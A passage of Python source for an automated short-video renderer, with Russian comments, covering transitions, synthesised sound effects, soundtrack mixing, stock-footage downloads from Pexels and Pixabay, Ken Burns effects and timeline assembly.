            big = im.resize((bw, bh), Image.BICUBIC)
            return big.crop(((bw - W) // 2, (bh - H) // 2, (bw - W) // 2 + W, (bh - H) // 2 + H))
        return Image.blend(_sc(img_a), _sc(img_b), q)
    if kind == "speed_ramp":
        # резкое ускорение сквозь кадр: сильный zoom-blur переход
        sa = 1.0 + 0.9 * q
        ba = img_a.resize((int(W * sa), int(H * sa)), Image.BICUBIC)
        ba = ba.crop(((ba.width - W) // 2, (ba.height - H) // 2,
                      (ba.width - W) // 2 + W, (ba.height - H) // 2 + H))
        sb = 0.7 + 0.3 * q
        bb = img_b.resize((max(1, int(W * sb)), max(1, int(H * sb))), Image.BICUBIC)
        canvas = Image.new("RGB", (W, H), (0, 0, 0))
        canvas.paste(bb, ((W - bb.width) // 2, (H - bb.height) // 2))
        return Image.blend(ba, canvas, min(1.0, q * 1.5))
    if kind == "glitch":
        # короткий цифровой сбой: RGB-split + сдвиг полос (только тут!)
        base = img_b if q >= 0.4 else img_a
        out = _rgb_split(base, int(14 * (1 - abs(q - 0.5) * 2)))
        d = ImageDraw.Draw(out)
        rnd = random.Random(seed + int(q * 10))
        for _ in range(5):
            y = rnd.randrange(H)
            hh = rnd.randrange(8, 60)
            dx = rnd.randrange(-70, 70)
            strip = out.crop((0, y, W, min(H, y + hh)))
            out.paste(strip, (dx, y))
        return out
    return img_b


# ---------- звук: beat-bed + синтезированные SFX ----------

def _sine(f0, f1, n, sr):
    if np is None:
        return None
    t = np.arange(n) / sr
    if f1 is None or f1 == f0:
        return np.sin(2 * np.pi * f0 * t)
    sweep = f0 + (f1 - f0) * t / max(1, len(t) / sr)
    phase = np.cumsum(2 * np.pi * sweep / sr)
    return np.sin(phase)


def _env(n, attack=0.005, decay=None):
    if np is None:
        return None
    a = max(1, int(n * attack))
    e = np.ones(n)
    e[:a] = np.linspace(0, 1, a)
    d = n if decay is None else min(n, int(n * decay))
    e[-d:] *= np.linspace(1, 0, d) ** 2
    return e


def synth_sfx(kind, sr=SR):
    """Возвращает numpy int16 mono сэмплы эффекта (или None)."""
    if np is None:
        return None
    if kind == "impact":
        n = int(sr * 0.7)
        kick = _sine(58, 34, n, sr) * _env(n, 0.002)
        noise = np.random.default_rng(7).standard_normal(n) * _env(n, 0.001, 0.25) * 0.5
        return ((kick * 0.9 + noise * 0.5) * 30000).astype(np.int16)
    if kind == "whoosh":
        n = int(sr * 0.35)
        noise = np.random.default_rng(11).standard_normal(n)
        hp = np.diff(noise, prepend=0)
        e = np.sin(np.pi * np.arange(n) / n) ** 2
        return ((hp * e * 0.8) * 22000).astype(np.int16)
    if kind == "riser":
        n = int(sr * 1.0)
        s = _sine(180, 1400, n, sr)
        e = (np.arange(n) / n) ** 2
        return ((s * e * 0.55) * 24000).astype(np.int16)
    if kind == "click":
        n = int(sr * 0.07)
        blip = _sine(2100, 1400, n, sr) * _env(n, 0.01, 0.9)
        return ((blip * 0.5) * 22000).astype(np.int16)
    if kind == "notify":
        n = int(sr * 0.4)
        s = np.zeros(n)
        n1 = int(sr * 0.16)
        s[:n1] = _sine(880, 880, n1, sr) * _env(n1, 0.01, 0.7)
        s[n1:n1 * 2] = _sine(1318, 1318, n1, sr) * _env(n1, 0.01, 0.7)
        return ((s * 0.5) * 22000).astype(np.int16)
    if kind == "bass":
        n = int(sr * 0.9)
        s = _sine(48, 40, n, sr) * _env(n, 0.004, 0.8)
        return ((s * 0.95) * 30000).astype(np.int16)
    return None


def build_soundtrack(shots, bounds, seconds, bpm, pause_win=None, sr=SR,
                     bed=1.0, sfx_gain=1.0, duck=None):
    """Микс: тёмный beat-bed по сетке + SFX на склейках. Возвращает int16 mono.

    bed/sfx_gain — уровни из пресета стиля (M15: фон тихий, не мешает голосу).
    duck — массив 0..1 (огибающая голоса): бит проседает под речью.
    """
    if np is None:
        return None
    n = int(seconds * sr)
    mix = np.zeros(n, dtype=np.float64)
    beats = beat_times(bpm, seconds)
    # bed: кик на каждый бит + саб-дрон
    for b in beats:
        i = int(b * sr)
        k = synth_sfx("bass", sr)
        if b and pause_win and pause_win[0] <= b <= pause_win[1]:
            continue  # в паузе — тишина (бит выпадает)
        m = min(len(k), n - i)
        if m > 0 and i < n:
            mix[i:i + m] += k[:m].astype(np.float64) * 0.15 * bed
    t = np.arange(n) / sr
    drone = (np.sin(2 * np.pi * 55 * t) * 0.5 + np.sin(2 * np.pi * 82.5 * t) * 0.3)
    drone *= (0.7 + 0.3 * np.sin(2 * np.pi * 0.15 * t))
    if pause_win:
        i0, i1 = int(pause_win[0] * sr), min(n, int(pause_win[1] * sr))
        drone[i0:i1] *= 0.15
    mix += drone * 1200 * bed
    # SFX на склейках (время конца каждого шота, кроме последнего)
    for s, end in zip(shots, bounds[1:]):
        if s["sfx"] in ("none", "silence") or end >= seconds - 0.2:
            continue
        sfx = synth_sfx(s["sfx"], sr)
        if sfx is None:
            continue
        i = int(end * sr)
        m = min(len(sfx), n - i)
        if m > 0 and i < n:
            mix[i:i + m] += sfx[:m].astype(np.float64) * 0.25 * sfx_gain  # S29: quieter
    if duck is not None and len(duck) == n:
        mix *= (1.0 - 0.65 * np.clip(duck, 0.0, 1.0))
    mix = np.clip(mix, -32768, 32767)
    return mix.astype(np.int16)


def write_wav(path, samples, sr=SR):
    with wave.open(path, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(sr)
        wf.writeframes(samples.tobytes())


# ---------- сборка таймлайна и рендер ----------

def build_fonts():
    return {
        "hero": _font(EXO2, 150, 900),
        "big": _font(EXO2, 118, 900),
        "big2": _font(EXO2, 88, 900),
        "sub": _font(JURA, 40, 700),
        "xs": _font(JURA, 32, 500),
    }


# ---------- реальные сток-кадры (M15): микс живого видео с графикой ----------

def fetch_stock_clips(tmpdir, queries, max_clips=4, orientation="portrait"):
    """Скачивает МНОГО сток-клипов с Pexels или Pixabay.

    M26: возвращает (clips, clip_q) — clip_q[i] = поисковый запрос, по
    которому скачан clips[i] (для контекстного подбора клипа шоту).
    Возвращает ([], []) при отсутствии ключей/ошибке (движок рисует
    painters, ничего не падает).

    M16: добавлен Pixabay как альтернатива (бесплатный ключ pixabay.com/docs/api).
    M20: orientation portrait|landscape (longform/YouTube качает landscape).
    M25: скачиваем много клипов — по несколько ПЕРВЫХ результатов на каждый
         поисковый запрос (per_page=8) с дедупом по размеру, пока не наберём
         max_clips. Так видео = много разных реальных роликов, а не 1-2.
    """
    import urllib.request as _rq
    import urllib.parse as _up
    import json as _json
    # M18: Pexels/Pixabay режут дефолтный Python-urllib UA (WAF 403) —
    # ходим с браузерным на поиск И скачивание
    _UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

    def _dl(link, dst):
        req = _rq.Request(link, headers={"User-Agent": _UA})
        with _rq.urlopen(req, timeout=60) as fh, open(dst, "wb") as out:
            out.write(fh.read())
        return os.path.getsize(dst)

    pexels_key = os.environ.get("PEXELS_API_KEY", "").strip()
    pixabay_key = os.environ.get("PIXABAY_API_KEY", "").strip()
    if not pexels_key and not pixabay_key:
        print("[cine] нет ключей стока (PEXELS/PIXABAY) — только рисованные кадры")
        return [], []
    sdir = os.path.join(tmpdir, "stock")
    os.makedirs(sdir, exist_ok=True)
    clips = []
    clip_q = []
    # --- Pexels ---
    seen_sizes = set()  # дедуп по размеру файла (похожие ролики)
    if pexels_key:
        # М25: до max_clips суммарно, по несколько видео на каждый запрос
        for qi, q in enumerate(list(queries or [])):
            if len(clips) >= max_clips:
                break
            try:
                url = ("https://api.pexels.com/videos/search?" + _up.urlencode(
                    {"query": q, "per_page": 4, "orientation": orientation,
                     "size": "medium"}))
                req = _rq.Request(url, headers={"Authorization": pexels_key,
                                                "User-Agent": _UA})
                data = _json.load(_rq.urlopen(req, timeout=20))
                vids = data.get("videos") or []
                if not vids:
                    continue
                for vi, vid in enumerate(vids):
                    if len(clips) >= max_clips:
                        break
                    files = vid.get("video_files") or []
                    if not files:
                        continue
                    # предпочитаем вертикальный (portrait) файл, иначе любой
                    files = sorted(files, key=lambda f: (
                        0 if (f.get("height") or 0) >= (f.get("width") or 9999) else 1,
                        f.get("width") or 9999))
                    link = files[0].get("link")
                    if not link:
                        continue
                    dst = os.path.join(sdir, f"clip_{qi}_{vi}.mp4")
                    if os.path.exists(dst):
                        continue
                    try:
                        _dl(link, dst)
                    except Exception:
                        continue
                    sz = os.path.getsize(dst)
                    if sz <= 50000 or sz in seen_sizes:
                        try:
                            os.remove(dst)
                        except OSError:
                            pass
                        continue
                    seen_sizes.add(sz)
                    clips.append(dst)
                    clip_q.append(q)
                    print(f"[cine] pexels {qi}_{vi}: {q} ({sz//1024} KB)")
            except Exception as e:
                code = getattr(e, "code", "")
                hint = (" — ключ невалиден, проверь PEXELS_API_KEY"
                        if code in (401, 403) else "")
                print(f"[cine] pexels пропущен ({q}): "
                      f"{type(e).__name__} {code}{hint}")
                continue
    # --- Pixabay (fallback если Pexels не дал результатов) ---
    if not clips and pixabay_key:
        for qi, q in enumerate(list(queries or [])):
            if len(clips) >= max_clips:
                break
            try:
                orient = ("landscape" if orientation == "landscape"
                          else "portrait")
                url = ("https://pixabay.com/api/videos/?" + _up.urlencode({
                    "key": pixabay_key, "q": q, "per_page": 8,
                    "video_type": "film", "orientation": orient,
                    "min_width": 360, "min_height": 360}))
                data = _json.load(_rq.urlopen(
                    _rq.Request(url, headers={"User-Agent": _UA}),
                    timeout=20))
                hits = data.get("hits") or []
                if not hits:
                    continue
                for hi, hit in enumerate(hits):
                    if len(clips) >= max_clips:
                        break
                    vids = hit.get("videos") or {}
                    # предпочитаем medium (960px) или small (480px) — вертикаль
                    vid = vids.get("medium") or vids.get("small") or vids.get("large")
                    link = vid.get("url") if vid else None
                    if not link:
                        continue
                    dst = os.path.join(sdir, f"clip_px{qi}_{hi}.mp4")
                    if os.path.exists(dst):
                        continue
                    try:
                        _dl(link, dst)
                    except Exception:
                        continue
                    sz = os.path.getsize(dst)
                    if sz <= 50000 or sz in seen_sizes:
                        try:
                            os.remove(dst)
                        except OSError:
                            pass
                        continue
                    seen_sizes.add(sz)
                    clips.append(dst)
                    clip_q.append(q)
                    print(f"[cine] pixabay {qi}_{hi}: {q} ({sz//1024} KB)")
            except Exception as e:
                code = getattr(e, "code", "")
                hint = (" — ключ невалиден, проверь PIXABAY_API_KEY"
                        if code in (401, 403) else "")
                print(f"[cine] pixabay пропущен ({q}): "
                      f"{type(e).__name__} {code}{hint}")
                continue
    return clips, clip_q


def fetch_stock_images(tmpdir, queries, max_images=12, orientation="portrait"):
    """S28: Скачивает сток-ИЗОБРАЖЕНИЯ (не видео) с Pexels для Ken Burns.

    Возвращает (image_paths, image_queries) — image_paths[i] = путь к PNG,
    image_queries[i] = поисковый запрос. Используется как fallback когда
    видео-клипы не совпадают с темой шота.
    """
    import urllib.request as _rq
    import urllib.parse as _up
    import json as _json
    _UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
    def _dl(link, dst):
        req = _rq.Request(link, headers={"User-Agent": _UA})
        with _rq.urlopen(req, timeout=30) as fh, open(dst, "wb") as out:
            out.write(fh.read())
        return os.path.getsize(dst)
    pexels_key = os.environ.get("PEXELS_API_KEY", "").strip()
    if not pexels_key:
        return [], []
    idir = os.path.join(tmpdir, "stock_images")
    os.makedirs(idir, exist_ok=True)
    image_paths = []
    image_queries = []
    seen_sizes = set()
    for qi, q in enumerate(list(queries or [])):
        if len(image_paths) >= max_images:
            break
        try:
            url = ("https://api.pexels.com/v1/search?" + _up.urlencode(
                {"query": q, "per_page": 5, "orientation": orientation,
                 "size": "medium"}))
            req = _rq.Request(url, headers={"Authorization": pexels_key,
                                            "User-Agent": _UA})
            data = _json.load(_rq.urlopen(req, timeout=20))
            photos = data.get("photos") or []
            if not photos:
                continue
            for pi, photo in enumerate(photos):
                if len(image_paths) >= max_images:
                    break
                # предпочитаем large (1080px) или original
                src = (photo.get("src", {}).get("large")
                       or photo.get("src", {}).get("original")
                       or photo.get("src", {}).get("portrait"))
                if not src:
                    continue
                dst = os.path.join(idir, f"img_{qi}_{pi}.jpg")
                if os.path.exists(dst):
                    continue
                try:
                    _dl(src, dst)
                except Exception:
                    continue
                sz = os.path.getsize(dst)
                if sz <= 10000 or sz in seen_sizes:
                    try:
                        os.remove(dst)
                    except OSError:
                        pass
                    continue
                seen_sizes.add(sz)
                image_paths.append(dst)
                image_queries.append(q)
                print(f"[cine] pexels img {qi}_{pi}: {q} ({sz//1024} KB)")
        except Exception as e:
            print(f"[cine] pexels img пропущен ({q}): {type(e).__name__}")
            continue
    return image_paths, image_queries


def _ken_burns(img_path, p, seed, W, H, cache=None):
    """S28: Ken Burns — движение камеры по статичной картинке.

    Масштабирует изображение до 1.3x viewport, затем скользящее окно
    (панорама + зум) по прогрессу p (0..1). Хеш seed определяет
    направление/тип движения (зум-ин, зум-аут, панорама).
    Кэширует базовое изображение в cache[img_path] для производительности.
    Возвращает RGB PIL Image размером (W, H).
    """
    # кэш: не открываем/ресайзим файл каждый кадр
    cache = cache or {}
    if img_path not in cache:
        img = Image.open(img_path).convert("RGB")
        scale = 1.3
        sw, sh = int(W * scale), int(H * scale)
        cache[img_path] = img.resize((sw, sh), Image.BICUBIC)
    base = cache[img_path]
    sw, sh = base.size
    # тип движения: 0=зум-ин, 1=зум-аут, 2=панорама H, 3=панорама V
    motion = seed % 4
    if motion == 0:  # зум-ин: от 1.3x к 1.0x
        z = 1.0 + 0.3 * (1.0 - p)
        zw, zh = int(W * z), int(H * z)
        tmp = base.resize((zw, zh), Image.BICUBIC)
        cx, cy = zw // 2, zh // 2
        img = tmp.crop((cx - W // 2, cy - H // 2, cx - W // 2 + W, cy - H // 2 + H))
    elif motion == 1:  # зум-аут: от 1.0x к 1.3x
        z = 1.0 + 0.3 * p
        zw, zh = int(W * z), int(H * z)
        tmp = base.resize((zw, zh), Image.BICUBIC)
        cx, cy = zw // 2, zh // 2
        img = tmp.crop((cx - W // 2, cy - H // 2, cx - W // 2 + W, cy - H // 2 + H))
    elif motion == 2:  # панорама горизонтальная
        max_dx = sw - W
        dx = int(p * max_dx)
        img = base.crop((dx, 0, dx + W, H))
    else:  # панорама вертикальная
        max_dy = sh - H
        dy = int(p * max_dy)
        img = base.crop((0, dy, W, dy + H))
    return img


def extract_stock_frames(ffmpeg, clips, outdir, fps=15, max_frames=180):
    """Режет из каждого клипа последовательные кадры для фона.

    M25/S27: возвращает СПИСОК КЛИПОВ, каждый — список кадров по времени
    ([[кадры клипа0], [кадры клипа1], ...]) для живого фона.
    S27.5: ОДИН ffmpeg-проход на клип с сеткой fps кадров/сек (по умолчанию
    10) — плотная выборка РЕАЛЬНЫХ кадров видео, а не одиночные frame'ы
    каждую секунду (16 штук на клип давали стробоскоп + blend далёких
    кадров = двоение). Paint_stock_bg проигрывает окно ровно длительности
    шота, поэтому фон движется в НАТУРАЛЬНОМ темпе.
    """
    os.makedirs(outdir, exist_ok=True)
    clip_groups = []
    for c in clips:
        gid = len(clip_groups)
        pat = os.path.join(outdir, f"st_g{gid}_%04d.png")
        r = subprocess.run(
            [ffmpeg, "-y", "-i", c,
             "-vf", f"scale=540:960,fps={fps}",
             "-frames:v", str(max_frames), pat],
            capture_output=True)
        group = sorted(glob.glob(os.path.join(outdir, f"st_g{gid}_*.png")))
        if r.returncode == 0 and len(group) >= 2:
            clip_groups.append(group)
    nf = sum(len(g) for g in clip_groups)
    print(f"[cine] сток-кадров: {nf} из {len(clip_groups)} клипов "
          f"(fps={fps}, ~{max(len(g) for g in clip_groups) if clip_groups else 0} "
          f"макс на клип)")
    return clip_groups


def _shot_stock_kws(shot):
    """Слова-ключи шота из его реплики/вижуала — для подбора клипа.

    S28: используем _VOICE_STOCK_KW (content-level) + _TOPIC_STOCK_KW
    для максимально широкого покрытия голосового текста шота.
    """
    import re as _re
    txt = " " + (shot.get("voice") or shot.get("sub") or "").lower() + " "
    vis = str(shot.get("visual") or "").lower()
    out = set()
    # Content-level: _VOICE_STOCK_KW (per-shot voice text)
    for kw in _VOICE_STOCK_KW:
        if kw in txt or kw in vis:
            out.add(kw)
    # Topic-level: _TOPIC_STOCK_KW
    for kw in _TOPIC_STOCK_KW:
        if kw in txt or kw in vis:
            out.add(kw)
    # Prefix matching for longer keywords (4+ chars)
    words = set(_re.findall(r"[a-zа-яё]{3,}", txt))
    for kw in list(_VOICE_STOCK_KW.keys()) + list(_TOPIC_STOCK_KW.keys()):
        if len(kw) >= 4 and any(w.startswith(kw[:4]) for w in words):
            out.add(kw)
    return out


def _assign_stock_clips(shots, clip_groups, clip_q, topic):
    """S28: контекстный подбор клипа шоту через _VOICE_STOCK_KW + _TOPIC_STOCK_KW.

    Shot keywords (RU/EN) → keyword dicts → EN queries → clip_q match.
    Используем оба словаря для максимально широкого покрытия.
    """
    assign = {}
    used = set()
    # Pre-build: every EN query → its set of source keys (from BOTH dicts)
    _q_to_kws: dict[str, set] = {}
    for _kw, _qs in _TOPIC_STOCK_KW.items():
        for _q in _qs:
            _q_to_kws.setdefault(_q, set()).add(_kw)
    for _kw, _qs in _VOICE_STOCK_KW.items():
        for _q in _qs:
            _q_to_kws.setdefault(_q, set()).add(_kw)
    for idx, s in enumerate(shots):
        kws = _shot_stock_kws(s)
        if not kws:
            continue
        # All EN queries that ANY of the shot's keywords maps to
        target_queries: set[str] = set()
        for kw in kws:
            target_queries.update(_TOPIC_STOCK_KW.get(kw, []))
            target_queries.update(_VOICE_STOCK_KW.get(kw, []))
        if not target_queries:
            continue
        best = None
        for ci, cq in enumerate(clip_q):
            if ci in used and sum(1 for c in used if c == ci) >= 2:
                continue
            # 1) exact match: clip query is one of the mapped target queries
            # 2) partial: clip query contains a target substring or vice versa
            if cq in target_queries:
                best = ci
                break
            if any(tq in cq or cq in tq for tq in target_queries):
                best = ci
                break
        if best is not None:
            assign[idx] = best
            used.add(best)
    # round-robin от hash темы (для разнообразия)
    coff = abs(hash(topic)) % len(clip_groups)
    ci = coff
    for idx in range(len(shots)):
        if idx in assign:
            continue
        while ci in used and sum(1 for c in used if c == ci) >= 2:
            ci = (ci + 1) % len(clip_groups)
        assign[idx] = ci
        used.add(ci)
        ci = (ci + 1) % len(clip_groups)
    return assign


def paint_stock_bg(clip_frames, cur, p, seed, P, cache, shot_sec=1.0, fps=15):
    """Живой фон: cover-fit кадр клипа по прогрессу p.

    M25: clip_frames — список кадров ОДНОГО клипа (последовательные по
    времени, ~fps кадров/сек из extract_stock_frames).
    S27.5: шот проигрывает РОВНО свою длительность видеоклипа в
    натуральном темпе — окно кадров = shot_sec * fps, сдвинутое по хешу
    (скользящее окно, разные шоты показывают разные участки клипа).
    Между кадрами линейная интерполяция (fps=10 даёт плотную сетку:
    движение плавное, без стробоскопа и без двоения далёких кадров).
    cur — ключ кэша (имя клипа). p (0..1) выбирает кадр внутри окна.
    """
    if not clip_frames:
        raise KeyError("пустой клип")
    n = len(clip_frames)
    # окно в кадрах = ровно длительность шота в натуральном темпе
    span = max(2, min(n, int(round(shot_sec * fps))))
    # скользящее окно: начало сдвинуто по хешу (повторяемо, но разные
    # шоты/клипы показывают разные участки видео; конец клипа не выходим)
    shift = (seed * 2654435761) % max(1, n - span + 1)
    fpos = shift + p * (span - 1)
    i0 = min(n - 1, int(fpos))
    i1 = min(n - 1, i0 + 1)
    t = fpos - i0
    if cur not in cache:
        cache[cur] = {}
    cslot = cache[cur]
    # S28: кэш только для окна [shift..shift+span+2], старые кадры выгружаем
    # (иначе 16 клипов × 300 кадров × 6MB = OOM на 7GB runner)
    for i in (i0, i1):
        if i not in cslot:
            bg = Image.open(clip_frames[i]).convert("RGB").resize((W, H), Image.BICUBIC)
            bg = bg.point(lambda v: int(v * 0.85))  # S28: ещё осветление (было 0.7)
            cslot[i] = bg
    if i0 == i1 or t < 0.05:
        img = cslot[i0].copy()
    else:
        img = Image.blend(cslot[i0], cslot[i1], t)
    img = _vignette(img, 0.15)  # S28: минимум виньетки (было 0.35)
    img = _grain(img, seed % (2 ** 31), 380, 22)
    # S28: выгрузка кадров за пределами окна (keep ±4 от i0/i1)
    lo, hi = max(0, min(i0, i1) - 4), min(n, max(i0, i1) + 5)
    for k in list(cslot):
        if k < lo or k >= hi:
            del cslot[k]
    return img


TRANS_DUR = {"hard_cut": 0.08, "whip": 0.35, "zoom": 0.4, "glitch": 0.3,
             "dip": 0.5, "match": 0.25, "speed_ramp": 0.3}


# ---------- M19: голос ведёт таймлайн ----------

# Интонация диктора по актам: (темп, тон, громкость) для edge-tts.
# hook — энергично, twist — медленно и зловеще, peak — громко и весомо.
# База чуть замедлена (-4%): Dmitry тараторит, речь должна успевать
# за картинку. Сырой SSML edge-tts 7.x экранирует — только параметры.
_PROSODY = {
    "hook": ("+2%", "+8Hz", "+0%"),
    "problem": ("-4%", "+2Hz", "+0%"),
    "escalation": ("-1%", "+4Hz", "+0%"),
    "peak": ("-8%", "+0Hz", "+10%"),
    "twist": ("-12%", "+6Hz", "+0%"),
    "accel": ("+0%", "+5Hz", "+0%"),
    "climax": ("-6%", "+3Hz", "+0%"),
}

# Один визуал — не дольше 3с (динамика TikTok): длинные реплики режутся
# на несколько кадров.
_MAX_VISUAL_SEC = 3.0


def _prosody(act):
    """Интонация акта -> (rate, pitch, volume) для edge-tts."""
    return _PROSODY.get(act or "problem", ("-4%", "+2Hz", "+0%"))


def _split_words(text, n):
    """Делит текст на n частей по границам слов (субтитры подсерий)."""
    words = (text or "").split()
    if n <= 1 or not words:
        return [text or ""]
    base, rem = divmod(len(words), n)
    out, k = [], 0
    for i in range(n):
        cnt = base + (1 if i < rem else 0)
        out.append(" ".join(words[k:k + cnt]))
        k += cnt
    return out


def _layout_voice_spans(shots, vmap, sec_durs):
    """M19: spans озвученных шотов + нарезка длинных реплик на кадры ≤3с.

    Мутирует shots (расширение на месте, первый подкадр — исходный dict).
    Возвращает [{"sec": j, "refs": [shot, ...]}] — refs[0] звучит с sec-файла.
    """
    import math as _m
    vpool = []
    for s in shots:
        if s.get("visual") not in vpool:
            vpool.append(s.get("visual"))
    cpool = []
    for s in shots:
        if s.get("camera") not in cpool:
            cpool.append(s.get("camera"))
    # проход 1: соседние одинаковые визуалы/камеры разводим (до нарезки)
    for i in range(1, len(shots)):
        if (shot_kind(shots[i]) == "cinematic"
                and shots[i].get("visual") == shots[i - 1].get("visual")):
            for cand in vpool:
                if cand != shots[i - 1].get("visual"):
                    shots[i]["visual"] = cand
                    break
        if shots[i].get("camera") == shots[i - 1].get("camera"):
            for cand in cpool:
                if cand != shots[i - 1].get("camera"):
                    shots[i]["camera"] = cand
                    break
    # проход 2: нарезка (с конца, чтобы индексы vmap не плыли)
    spans = []
    order = sorted(range(len(vmap)), key=lambda j: vmap[j][0], reverse=True)
    for j in order:
        idx, s = vmap[j]
        d = sec_durs[j]
        span = max(0.9, float(d) + 0.35)
        if shot_kind(s) == "cinematic":
            n = max(1, int(_m.ceil(span / _MAX_VISUAL_SEC)))
        else:
            n = 1  # текстовые карточки читаются целиком
        sub = span / n
        parts = _split_words(s.get("sub", ""), n)
        refs = [s]
        s["dur"] = max(sub, 0.8)
        s["_voice_sec"] = sub  # actual voice duration for subs sync
        if s.get("subs"):
            s["subs"] = [{"lines": [parts[0][:70]], "mode": "sub"}] \
                if parts[0] else []
            s["sub"] = parts[0][:70]
        prev_vis, prev_cam = s.get("visual"), s.get("camera")
        for k in range(1, n):
            vis = next((c for c in vpool if c != prev_vis), prev_vis)
            cam = next((c for c in cpool
                        if c != prev_cam and c != "static"), prev_cam)
            c2 = dict(s)
            c2["dur"] = max(sub, 0.8)
            c2["visual"] = vis
            c2["camera"] = cam
            c2["texts"] = []
            c2["voice"] = ""
            c2["trans_out"] = "hard_cut"
            c2["sfx"] = "none"
            c2["seed"] = s.get("seed", 1) + k
            c2["subs"] = [{"lines": [parts[k][:70]], "mode": "sub"}] \
                if parts[k] else []
            c2["sub"] = parts[k][:70]
            c2["_voice_sec"] = sub  # actual voice duration for subs sync
            refs.append(c2)
            prev_vis, prev_cam = vis, cam
        shots[idx:idx + 1] = refs
        spans.append({"sec": j, "refs": refs})
    spans.sort(key=lambda sp: sp["sec"])
    # проход 3: границы спанов — соседние одинаковые визуалы разводим
    for i in range(1, len(shots)):
        if (shot_kind(shots[i]) == "cinematic"
                and shots[i].get("visual") == shots[i - 1].get("visual")):
            for cand in vpool:
                if cand != shots[i - 1].get("visual"):
                    shots[i]["visual"] = cand
                    break
    return spans


def _fit_fillers(shots, voiced_ids, seconds, full_voice):
    """Неозвученные кадры добивают остаток хронометража (голос не трогаем)."""
    fills = [s for s in shots if id(s) not in voiced_ids]
    if not fills:
        return
    if full_voice:
        # статья: паузы короткие, без тянучки
        for s in fills:
            s["dur"] = min(max(float(s["dur"]), 0.6), 2.5)
    else:
        vtot = sum(float(s["dur"]) for s in shots if id(s) in voiced_ids)
        budget = max(8.0, float(seconds) - vtot)
        ftot = sum(float(s["dur"]) for s in fills) or 1.0
        k = budget / ftot
        for s in fills:
            s["dur"] = max(0.6, float(s["dur"]) * k)


def _assemble_voice(ffmpeg, tmpdir, items, total, sr=SR):
    """M19: точная сборка голосового трека — чанк j стартует на своём шоте.

    items: [(sec_mp3, start_sec)]. Возвращает wav-путь или None.
    """
    import wave as _wv
    if np is None:
        return None
    n = int(total * sr)
    if n <= 0:
        return None
    track = np.zeros(n, dtype=np.float64)
    ok = False
    for f, start in items:
        w = os.path.join(tmpdir, "mix_" + os.path.basename(f) + ".wav")
        r = subprocess.run(
            [ffmpeg, "-y", "-i", f, "-ar", str(sr), "-ac", "1", w],
            capture_output=True)
        if r.returncode != 0:
            continue
        try:
            with _wv.open(w, "rb") as wf:
                raw = wf.readframes(wf.getnframes())
            a = np.frombuffer(raw, dtype=np.int16).astype(np.float64)
        except Exception:
            continue
        o = max(0, int(start * sr))
        m = min(len(a), n - o)
        if m > 0:
            track[o:o + m] += a[:m]
            ok = True
    if not ok:
        return None
    out = os.path.join(tmpdir, "voice_mix.wav")
    write_wav(out, np.clip(track, -32768, 32767).astype(np.int16))
    return out


def render_frame(shot, p, fonts, P, stock=None):
    """Один кадр тела шота: сцена + камера + типографика.

    stock: {"frames": [ [кадры клипа0], [кадры клипа1], ...], "cache": {},
            "images": [path1, ...], "img_queries": [...]}
    — если шоту назначен живой фон (shot["stock"] = индекс КЛИПА), рисуем
    сток + субтитр вместо painter'а. p выбирает кадр внутри клипа (движение).
    S28: если шот — картинка (shot["_is_image"]), рисуем Ken Burns эффект.
    """
    pw = warp_progress(p, shot.get("speed", (1.0, 1.0)))
    si = shot.get("stock")
    # S28: Ken Burns для статичных картинок
    if stock and si is not None and shot.get("_is_image"):
        images = stock.get("images") or []
        if si < len(images):
            img = _ken_burns(images[si], pw, shot.get("seed", 1), W, H,
                             stock.get("cache"))
        else:
            img = paint_scene(shot["visual"], pw, shot.get("seed", 1), P, fonts,
                              shot.get("accent", "accent"))
    elif stock and si is not None:
        entry = stock["frames"][si] if si < len(stock["frames"]) else None
        # M25: вложенный формат = [ [кадры клипа], ... ] (живое движение);
        # плоский (video_long) = [кадр,...] — одиночный статичный фон.
        clip = entry if isinstance(entry, list) and entry and isinstance(
            entry[0], str) else None
        if clip:
            img = paint_stock_bg(clip, si, pw, shot.get("seed", 1), P,
                                 stock["cache"], shot.get("dur", 1.0))
        elif isinstance(entry, str):
            img = paint_stock_bg([entry], si, 0.0, shot.get("seed", 1), P,
                                 stock["cache"])
        else:
            img = paint_scene(shot["visual"], pw, shot.get("seed", 1), P, fonts,
                              shot.get("accent", "accent"))
    else:
        img = paint_scene(shot["visual"], pw, shot.get("seed", 1), P, fonts,
                          shot.get("accent", "accent"))
    img = apply_camera(img, shot.get("camera", "push_in"), pw,
                       shot.get("seed", 1), int(p * 1000))
    if shot.get("texts"):
        draw_texts(img, shot["texts"], p, fonts, P)
    # S28: субтитры в нижней трети экрана
    # S29: auto-generate subs from voice text when missing
    subs = shot.get("subs")
    if not subs:
        vtxt = (shot.get("voice") or shot.get("sub") or "").strip()
        if vtxt:
            subs = [{"lines": [vtxt[:70]], "mode": "sub"}]
    if subs:
        vr = shot.get("_voice_ratio", 1.0)
        if vr < 1.0 and p > vr:
            # S30: fade out subs after voice ends (12% fade window)
            fade = max(0.0, 1.0 - (p - vr) / 0.12)
            if fade > 0.01:
                overlay = Image.new("RGBA", img.size, (0, 0, 0, 0))
                draw_texts(overlay, subs, min(p, vr), fonts, P)
                # reduce alpha by fade factor
                r, g, b, a = overlay.split()
                a = a.point(lambda x: int(x * fade))
                overlay = Image.merge("RGBA", (r, g, b, a))
                img.paste(Image.alpha_composite(img.convert("RGBA"),
                                                overlay).convert("RGB"))
        else:
            draw_texts(img, subs, p, fonts, P)
    return img


def build_timeline(shots, seconds, fps, bpm):
    """Раскладка: тела шотов + переходы. Возвращает (segments, bounds, total).

    segments: [{kind:'body', shot, n}, {kind:'trans', a, b, trans, n}...]
    bounds: времена концов шотов (для SFX).
    """
    durs = snap_cuts([s["dur"] for s in shots], bpm)
    for s, d in zip(shots, durs):
        s["dur"] = d
    # времена склеек
    bounds, acc = [0.0], 0.0
    for d in durs:
        acc += d
        bounds.append(round(acc, 3))
    segments = []
    for i, s in enumerate(shots):
        want = max(3, int(round(s["dur"] * fps)))
        td = TRANS_DUR.get(s.get("trans_out", "hard_cut"), 0.1) if i < len(shots) - 1 else 0.0
        n_trans = max(1, int(round(td * fps))) if td > 0 else 0
        # переход не должен раздувать хронометраж: тело+переход = want кадров
        n_trans = min(n_trans, max(1, want - 2))
        n_body = max(2, want - n_trans)
